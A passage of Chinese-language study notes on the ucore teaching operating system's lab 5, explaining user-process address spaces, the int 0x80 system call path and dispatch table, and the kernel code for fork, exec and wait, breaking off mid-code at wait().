用户进程的虚拟地址空间</h4><p>在tools/user.ld描述了用户程序的用户虚拟空间的执行入口虚拟地址：</p><figure class="highlight coq"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs coq">SECTIONS &#123;<br>    /* <span class="hljs-keyword">Load</span> programs <span class="hljs-built_in">at</span> this address: <span class="hljs-string">&quot;.&quot;</span> means the current address */<br>    . = <span class="hljs-number">0x800020</span>;<br></code></pre></div></td></tr></table></figure><p>在tools/kernel.ld描述了操作系统的内核虚拟空间的起始入口虚拟地址：</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts"><span class="hljs-class">SECTIONS </span>&#123;<br>    <span class="hljs-comment">/* Load the kernel at this address: &quot;.&quot; means the current address */</span><br>    . = <span class="hljs-number">0xC0100000</span>;<br></code></pre></div></td></tr></table></figure><p>这样ucore把用户进程的虚拟地址空间分了两块，一块与内核线程一样，是所有用户进程都共享的内核虚拟地址空间，映射到同样的物理内存空间中，这样在物理内存中只需放置一份内核代码，使得用户进程从用户态进入核心态时，内核代码可以统一应对不同的内核程序；另外一块是用户虚拟地址空间，虽然虚拟地址范围一样，但映射到不同且没有交集的物理内存空间中。这样当ucore把用户进程的执行代码（即应用程序的执行代码）和数据（即应用程序的全局变量等）放到用户虚拟地址空间中时，确保了各个进程不会“非法”访问到其他进程的物理内存空间。</p><h4 id="c-创建并执行用户进程"><a href="#c-创建并执行用户进程" class="headerlink" title="c. 创建并执行用户进程"></a>c. 创建并执行用户进程</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">vector128(vectors.S)--\&gt;<br>__alltraps(trapentry.S)--\&gt;trap(trap.c)--\&gt;trap_dispatch(trap.c)--\&gt;syscall(syscall.c)--\&gt;sys_exec(syscall.c）<br>--\&gt;do_execve(proc.c)<br></code></pre></div></td></tr></table></figure><blockquote><p>先清空当前进程的空间, 然后再alloc新的空间</p></blockquote><p>最终通过<strong>do_execve</strong>函数来完成用户进程的创建工作。</p><p><strong>load_icode</strong>函数的主要工作就是给用户进程建立一个能够让用户进程正常运行的用户环境。此函数有一百多行.</p><h3 id="3-系统调用实现"><a href="#3-系统调用实现" class="headerlink" title="3.系统调用实现"></a>3.系统调用实现</h3><p>采用系统调用机制为用户进程提供一个获得操作系统服务的统一接口层，这样一来可简化用户进程的实现，把一些共性的、繁琐的、与硬件相关、与特权指令相关的任务放到操作系统层来实现，但提供一个简洁的接口给用户进程调用；二来这层接口事先可规定好，且严格检查用户进程传递进来的参数和操作系统要返回的数据，使得让操作系统给用户进程服务的同时，保护操作系统不会被用户进程破坏。</p><p>从硬件层面上看，需要硬件能够支持在用户态的用户进程通过某种机制切换到内核态。试验一讲述中断硬件支持和软件处理过程其实就可以用来完成系统调用所需的软硬件支持。下面我们来看看如何在ucore中实现系统调用。</p><h4 id="a-初始化系统调用对应的中断描述符"><a href="#a-初始化系统调用对应的中断描述符" class="headerlink" title="a. 初始化系统调用对应的中断描述符"></a>a. 初始化系统调用对应的中断描述符</h4><p>在ucore初始化函数kern_init中调用了idt_init函数来初始化中断描述符表，并设置一个特定中断号的中断门，专门用于用户进程访问系统调用。此事由ide_init函数完成：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">idt_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">extern</span> <span class="hljs-keyword">uintptr_t</span> __vectors[];<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(idt) / <span class="hljs-keyword">sizeof</span>(struct gatedesc); i ++) &#123;<br>        SETGATE(idt[i], <span class="hljs-number">0</span>, GD_KTEXT, __vectors[i], DPL_KERNEL);<br>    &#125;<br>    SETGATE(idt[T_SYSCALL], <span class="hljs-number">1</span>, GD_KTEXT, __vectors[T_SYSCALL], DPL_USER);<br>    lidt(&amp;idt_pd);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在上述代码中，可以看到在执行加载中断描述符表lidt指令前，专门设置了一个特殊的中断描述符idt[T_SYSCALL]，它的特权级设置为DPL_USER，中断向量处理地址在__vectors[T_SYSCALL]处。这样建立好这个中断描述符后，一旦用户进程执行“INT T_SYSCALL”后，由于此中断允许用户态进程产生（注意它的特权级设置为DPL_USER），所以CPU就会从用户态切换到内核态，保存相关寄存器，并跳转到__vectors[T_SYSCALL]处开始执行，形成如下执行路径：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">vector128(vectors.S)--\&gt;<br>__alltraps(trapentry.S)--\&gt;trap(trap.c)--\&gt;trap_dispatch(trap.c)--\&gt;syscall(syscall.c)<br></code></pre></div></td></tr></table></figure><p>在syscall中，根据系统调用号来完成不同的系统调用服务。</p><h4 id="b-建立系统调用的-用户库-准备"><a href="#b-建立系统调用的-用户库-准备" class="headerlink" title="b. 建立系统调用的**用户库**准备"></a>b. 建立系统调用的**<u>用户库</u>**准备</h4><p>在操作系统中初始化好系统调用相关的中断描述符、中断处理起始地址等后，还需在用户态的应用程序中初始化好相关工作，简化应用程序访问系统调用的复杂性。<strong>为此在用户态建立了一个中间层，即简化的libc实现</strong>，在user/libs/ulib.[ch]和user/libs/syscall.[ch]中完成了对访问系统调用的封装。用户态最终的访问系统调用函数是syscall，实现如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">syscall</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num, ...)</span> </span>&#123;<br>    va_list ap;<br>    va_start(ap, num);<br>    <span class="hljs-keyword">uint32_t</span> a[MAX_ARGS];<br>    <span class="hljs-keyword">int</span> i, ret;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAX_ARGS; i ++) &#123;<br>        a[i] = va_arg(ap, <span class="hljs-keyword">uint32_t</span>);<br>    &#125;<br>    va_end(ap);<br><br>    <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span> <span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-string">&quot;int %1;&quot;</span></span></span><br><span class="hljs-params"><span class="hljs-function">        : <span class="hljs-string">&quot;=a&quot;</span> (ret)</span></span><br><span class="hljs-params"><span class="hljs-function">        : <span class="hljs-string">&quot;i&quot;</span> (T_SYSCALL),</span></span><br><span class="hljs-params"><span class="hljs-function">          <span class="hljs-string">&quot;a&quot;</span> (num),</span></span><br><span class="hljs-params"><span class="hljs-function">          <span class="hljs-string">&quot;d&quot;</span> (a[<span class="hljs-number">0</span>]),</span></span><br><span class="hljs-params"><span class="hljs-function">          <span class="hljs-string">&quot;c&quot;</span> (a[<span class="hljs-number">1</span>]),</span></span><br><span class="hljs-params"><span class="hljs-function">          <span class="hljs-string">&quot;b&quot;</span> (a[<span class="hljs-number">2</span>]),</span></span><br><span class="hljs-params"><span class="hljs-function">          <span class="hljs-string">&quot;D&quot;</span> (a[<span class="hljs-number">3</span>]),</span></span><br><span class="hljs-params"><span class="hljs-function">          <span class="hljs-string">&quot;S&quot;</span> (a[<span class="hljs-number">4</span>])</span></span><br><span class="hljs-params"><span class="hljs-function">        : <span class="hljs-string">&quot;cc&quot;</span>, <span class="hljs-string">&quot;memory&quot;</span>)</span></span>;<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>从中可以看出，应用程序调用的exit/fork/wait/getpid等库函数最终都会调用syscall函数，只是调用的参数不同而已，如果看最终的汇编代码会更清楚：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">……<br>  34:    8b 55 d4               mov    -0x2c(%ebp),%edx<br>  37:    8b 4d d8               mov    -0x28(%ebp),%ecx<br>  3a:    8b 5d dc               mov    -0x24(%ebp),%ebx<br>  3d:    8b 7d e0               mov    -0x20(%ebp),%edi<br>  40:    8b 75 e4               mov    -0x1c(%ebp),%esi<br>  43:    8b 45 08               mov    0x8(%ebp),%eax<br>  46:    cd 80                  int    $0x80<br>  48: 89 45 f0                mov    %eax,-0x10(%ebp)<br>……<br></code></pre></div></td></tr></table></figure><p>可以看到其实是把系统调用号放到EAX，其他5个参数a[0]~a[4]分别保存到EDX/ECX/EBX/EDI/ESI五个寄存器中，及最多用6个寄存器来传递系统调用的参数，且系统调用的返回结果是EAX。比如对于getpid库函数而言，系统调用号（SYS_getpid=18）是保存在EAX中，返回值（调用此库函数的的当前进程号pid）也在EAX中。</p><h4 id="c-与用户进程相关的系统调用"><a href="#c-与用户进程相关的系统调用" class="headerlink" title="c. 与用户进程相关的系统调用"></a>c. 与用户进程相关的系统调用</h4><p>在本实验中，与进程相关的各个系统调用属性如下所示：</p><table><thead><tr><th>系统调用名</th><th>含义</th><th>具体完成服务的函数</th></tr></thead><tbody><tr><td>SYS_exit</td><td>process exit</td><td>do_exit</td></tr><tr><td>SYS_fork</td><td>create child process, dup mm</td><td>do_fork–&gt;wakeup_proc</td></tr><tr><td>SYS_wait</td><td>wait child process</td><td>do_wait</td></tr><tr><td>SYS_exec</td><td>after fork, process execute a new program</td><td>load a program and refresh the mm</td></tr><tr><td>SYS_yield</td><td>process flag itself need resecheduling</td><td>proc-&gt;need_sched=1, then scheduler will rescheule this process</td></tr><tr><td>SYS_kill</td><td>kill process</td><td>do_kill–&gt;proc-&gt;flags |= PF_EXITING, –&gt;wakeup_proc–&gt;do_wait–&gt;do_exit</td></tr><tr><td>SYS_getpid</td><td>get the process’s pid</td><td></td></tr></tbody></table><p>通过这些系统调用，可方便地完成从进程/线程创建到退出的整个运行过程。</p><h4 id="d-系统调用的执行过程"><a href="#d-系统调用的执行过程" class="headerlink" title="d. 系统调用的执行过程"></a>d. 系统调用的执行过程</h4><p>当进入int 0x80中断后, 处理器和汇编码合作完成压入trapframe, 调用trap函数, 可以看到和之前的代码多了判断current的部分, </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">trap</span><span class="hljs-params">(struct trapframe *tf)</span> </span>&#123;<br>    <span class="hljs-comment">// dispatch based on what type of trap occurred</span><br>    <span class="hljs-comment">// used for previous projects</span><br>    <span class="hljs-keyword">if</span> (current == <span class="hljs-literal">NULL</span>) &#123;<br>        trap_dispatch(tf);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// keep a trapframe chain in stack</span><br>        <span class="hljs-comment">// 干嘛要保存这东西?</span><br>        struct trapframe *otf = current-&gt;tf;<br>        current-&gt;tf = tf;<br><br>        <span class="hljs-keyword">bool</span> in_kernel = trap_in_kernel(tf);<br><br>        trap_dispatch(tf);<br><br>        current-&gt;tf = otf;<br>        <span class="hljs-keyword">if</span> (!in_kernel) &#123;<br>            <span class="hljs-keyword">if</span> (current-&gt;flags &amp; PF_EXITING) &#123;<span class="hljs-comment">//只有do_kill()才会设置PF_EXITING</span><br>                do_exit(-E_KILLED);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (current-&gt;need_resched) &#123;<br>                schedule();<br>            &#125;&#125;&#125;&#125;<br></code></pre></div></td></tr></table></figure><p>然后进入trap_dispatch()中的syscall(), 比较巧妙的是通过<strong>函数指针列表</strong>来确定调用哪个函数:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-title">int</span> <span class="hljs-params">(*syscalls[])</span><span class="hljs-params">(<span class="hljs-keyword">uint32_t</span> arg[])</span> </span>= &#123; <span class="hljs-comment">//funtion ptr array</span><br>    [SYS_exit]              sys_exit,<br>    [SYS_fork]              sys_fork,<br>    [SYS_wait]              sys_wait,<br>    [SYS_exec]              sys_exec,<br>    [SYS_yield]             sys_yield,<br>    [SYS_kill]              sys_kill,<br>    [SYS_getpid]            sys_getpid,<br>    [SYS_putc]              sys_putc,<br>    [SYS_pgdir]             sys_pgdir,<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NUM_SYSCALLS        ((sizeof(syscalls)) / (sizeof(syscalls[0])))</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">syscall</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">tf</span> =</span> current-&gt;tf;<br>    <span class="hljs-keyword">uint32_t</span> arg[<span class="hljs-number">5</span>];<br>    <span class="hljs-keyword">int</span> num = tf-&gt;tf_regs.reg_eax;<br>    <span class="hljs-keyword">if</span> (num &gt;= <span class="hljs-number">0</span> &amp;&amp; num &lt; NUM_SYSCALLS) &#123;<br>        <span class="hljs-keyword">if</span> (syscalls[num] != <span class="hljs-literal">NULL</span>) &#123;<br>            arg[<span class="hljs-number">0</span>] = tf-&gt;tf_regs.reg_edx;<br>            arg[<span class="hljs-number">1</span>] = tf-&gt;tf_regs.reg_ecx;<br>            arg[<span class="hljs-number">2</span>] = tf-&gt;tf_regs.reg_ebx;<br>            arg[<span class="hljs-number">3</span>] = tf-&gt;tf_regs.reg_edi;<br>            arg[<span class="hljs-number">4</span>] = tf-&gt;tf_regs.reg_esi;<br>            tf-&gt;tf_regs.reg_eax = syscalls[num](arg);<span class="hljs-comment">//`syscalls[num]` is function ptr, and `(arg)` is argument</span><br>            <span class="hljs-keyword">return</span> ;<br>        &#125;<br>    &#125;<br>    print_trapframe(tf);<br>    panic(<span class="hljs-string">&quot;undefined syscall %d, pid = %d, name = %s.\n&quot;</span>,<br>            num, current-&gt;pid, current-&gt;name);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>如果从哪个系统调用返回了就执行正常的中断退出(比如fork).</p><h3 id="4-fork-exec-wait-exit"><a href="#4-fork-exec-wait-exit" class="headerlink" title="4.fork/exec/wait/exit"></a>4.fork/exec/wait/exit</h3><h4 id="fork"><a href="#fork" class="headerlink" title="fork():"></a>fork():</h4><blockquote><p>重复了一下lab4中的内容, 有点不熟悉, 这种流程分析还是要自己写</p></blockquote><p><img src="../../image/ucore/image-20211228201516840.png" alt="image-20211228201516840"></p><p>sys_fork()简单的从current-&gt;tf中取出stack地址, 作为参数调用do_fork():</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">sys_fork</span><span class="hljs-params">(<span class="hljs-keyword">uint32_t</span> arg[])</span> </span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">tf</span> =</span> current-&gt;tf;<br>    <span class="hljs-keyword">uintptr_t</span> <span class="hljs-built_in">stack</span> = tf-&gt;tf_esp;<br>    <span class="hljs-comment">//int do_fork(uint32_t clone_flags, uintptr_t stack, struct trapframe *tf)</span><br>    <span class="hljs-keyword">return</span> do_fork(<span class="hljs-number">0</span>, <span class="hljs-built_in">stack</span>, tf);<br>&#125;<br></code></pre></div></td></tr></table></figure><p> 在这里值得自己思考一下fork一个进程需要做出哪些工作?</p><ul><li>首先一个进程有自己的控制块proc_struct, 我们需要alloc_proc()一个</li><li>每个进程都有自己的内核栈, 需要重新alloc2个4KB的page(KSTACKSIZE)</li><li>还有一个mm_struct也很重要, 需要alloc一个并将旧的复制到新进程中<ul><li>还要看clone_flag, 如果为false则建立新的, 否则直接使用旧的</li><li>调用mm_creat(); 注意到mm中管理着页目录表, 还要重新建立一个新的; 然后是**lock_mm(oldmm)(不知道是什么)**紧跟着dup_mm来复制内存空间中的内容, 注意到内存空间是由mm中的vma链表管理的, 需要遍历每一个vma块, 然后再调用<code>copy_range(to-&gt;pgdir, from-&gt;pgdir, vma-&gt;vm_start, vma-&gt;vm_end, share)</code>来copy内存, 具体详见练习2.</li></ul></li><li>然后要设置一下子进程的一些状态, copy_thread函数在lab4中有介绍.</li><li>插入链表(两个), 设置关系, 然后wakeup, 结束</li></ul><p><code>set_links</code>函数会为当前进程间设置合适的关系，其实现如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*************************************************************</span><br><span class="hljs-comment">process relations</span><br><span class="hljs-comment">parent:           proc-&gt;parent  (proc is children)</span><br><span class="hljs-comment">children:         proc-&gt;cptr    (proc is parent)</span><br><span class="hljs-comment">older sibling:    proc-&gt;optr    (proc is younger sibling)</span><br><span class="hljs-comment">younger sibling:  proc-&gt;yptr    (proc is older sibling)</span><br><span class="hljs-comment">*************************************************************/</span><br><span class="hljs-comment">// set_links - set the relation links of process</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">set_links</span><span class="hljs-params">(struct proc_struct *proc)</span> </span>&#123;<br>    list_add(&amp;proc_list, &amp;(proc-&gt;list_link));<br>    proc-&gt;yptr = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span> ((proc-&gt;optr = proc-&gt;parent-&gt;cptr) != <span class="hljs-literal">NULL</span>)<br>        proc-&gt;optr-&gt;yptr = proc;<br>    proc-&gt;parent-&gt;cptr = proc;<br>    nr_process ++;<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><p>除了lab4熟知的<code>list_add</code>与<code>nr_process++</code>，该函数还设置了<code>proc_struct</code>中的<code>optr、yptr</code>以及<code>cptr</code>成员。</p></li><li><p>其中，<code>cptr</code>指针指向当前进程的子进程中，<strong>最新创建</strong>的那个子进程，即<code>children</code>；<code>yptr</code>指向<strong>与当前进程共享同一个父进程，但比当前进程的创建时间更晚的进程</strong>，即<code>younger sibling</code>。而<code>optr</code>指针的功能则与<code>yptr</code>相反，指向<code>older sibling</code>。</p></li><li><p>进程间关系如下图所示</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">                     +----------------+<br>                     | parent process |<br>                     +----------------+<br>              parent ^         \       ^  parent<br>                    /           \       \<br>                   /             \ cptr  \<br>                  /         yptr  V       \      yptr<br>           +-------------+  --&gt;  +-------------+  --&gt;  <span class="hljs-literal">NULL</span><br>           | old process |       | New Process |<br><span class="hljs-literal">NULL</span>  &lt;--  +-------------+  &lt;--  +-------------+<br>      optr                  optr<br></code></pre></div></td></tr></table></figure></li></ul><h4 id="exec"><a href="#exec" class="headerlink" title="exec():"></a>exec():</h4><p>首先从do_exec参数来看需要创建进程名称字符数组, 程序长度, ELF文件地址, 大小四个参数</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">do_execve</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *binary, <span class="hljs-keyword">size_t</span> size)</span> </span><br></code></pre></div></td></tr></table></figure><p>具体注释在下方:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">do_execve</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *binary, <span class="hljs-keyword">size_t</span> size)</span> </span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> current-&gt;mm;<br>    <span class="hljs-comment">//例行检查以及校正名称长度</span><br>    <span class="hljs-keyword">if</span> (!user_mem_check(mm, (<span class="hljs-keyword">uintptr_t</span>)name, len, <span class="hljs-number">0</span>)) &#123;<br>        <span class="hljs-keyword">return</span> -E_INVAL;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (len &gt; PROC_NAME_LEN) &#123;<br>        len = PROC_NAME_LEN;<br>    &#125;<br><span class="hljs-comment">//从name地址上复制名称字符串</span><br>    <span class="hljs-keyword">char</span> local_name[PROC_NAME_LEN + <span class="hljs-number">1</span>];<br>    <span class="hljs-built_in">memset</span>(local_name, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(local_name));<br>    <span class="hljs-built_in">memcpy</span>(local_name, name, len);<br><span class="hljs-comment">//如果current-&gt;mm不为NULL, 说明为用户进程, 清空一下mm(包括vma链表,页目录表,以及mm自身)</span><br>    <span class="hljs-keyword">if</span> (mm != <span class="hljs-literal">NULL</span>) &#123;<br>        lcr3(boot_cr3);<br>        <span class="hljs-keyword">if</span> (mm_count_dec(mm) == <span class="hljs-number">0</span>) &#123;<br>            exit_mmap(mm);<br>            put_pgdir(mm);<br>            mm_destroy(mm);<br>        &#125;<br>        current-&gt;mm = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-keyword">int</span> ret;<br>    <span class="hljs-comment">//解析ELF文件以及建立mm内容</span><br>    <span class="hljs-keyword">if</span> ((ret = load_icode(binary, size)) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">goto</span> execve_exit;<span class="hljs-comment">//出错则退出</span><br>    &#125;<br>    set_proc_name(current, local_name);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>execve_exit:<br>    do_exit(ret);<br>    panic(<span class="hljs-string">&quot;already exit: %e.\n&quot;</span>, ret);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>可以看出解析ELF文件才是大头. 代码在<strong>练习1</strong>或者直接看源码.</p><p><strong>load_icode</strong>函数的主要工作就是给用户进程建立一个能够让用户进程正常运行的用户环境。此函数有一百多行，完成了如下重要工作：</p><ol><li>调用mm_create函数来申请进程的内存管理数据结构mm所需内存空间，并对mm进行初始化；</li><li>调用setup_pgdir来申请一个页目录表所需的一个页大小的内存空间，并把描述ucore内核虚空间映射的内核页表（boot_pgdir所指）的内容拷贝到此新目录表中，最后让mm-&gt;pgdir指向此页目录表，这就是进程新的页目录表了，且能够正确映射内核虚空间；</li><li>根据应用程序执行码的起始位置来解析此ELF格式的执行程序，并调用mm_map函数根据ELF格式的执行程序说明的各个段（代码段、数据段、BSS段等）的起始位置和大小建立对应的vma结构，并把vma插入到mm结构中，从而表明了用户进程的合法用户态虚拟地址空间；</li><li>调用根据执行程序各个段的大小分配物理内存空间，并根据执行程序各个段的起始位置确定虚拟地址，并在页表中建立好物理地址和虚拟地址的映射关系，然后把执行程序各个段的内容拷贝到相应的内核虚拟地址中，至此应用程序执行码和数据已经根据编译时设定地址放置到虚拟内存中了；</li><li>需要给用户进程设置用户栈，为此调用mm_mmap函数建立用户栈的vma结构，明确用户栈的位置在用户虚空间的顶端，大小为256个页，即1MB，并分配一定数量的物理内存且建立好栈的虚地址&lt;–&gt;物理地址映射关系；</li><li>至此,进程内的内存管理vma和mm数据结构已经建立完成，于是把mm-&gt;pgdir赋值到cr3寄存器中，即更新了用户进程的虚拟内存空间，此时的initproc已经被hello的代码和数据覆盖，成为了第一个用户进程，但此时这个用户进程的执行现场还没建立好；</li><li>先清空进程的中断帧，再重新设置进程的中断帧，使得在执行中断返回指令“iret”后，能够让CPU转到用户态特权级，并回到用户态内存空间，使用用户态的代码段、数据段和堆栈，且能够跳转到用户进程的第一条指令执行，并确保在用户态能够响应中断；</li></ol><p>至此，用户进程的用户环境已经搭建完毕。此时initproc将按产生系统调用的函数调用路径原路返回，执行中断返回指令“iret”（位于trapentry.S的最后一句）后，将切换到用户进程hello的第一条语句位置_start处（位于user/libs/initcode.S的第三句）开始执行。</p><h4 id="wait"><a href="#wait" class="headerlink" title="wait()"></a>wait()</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 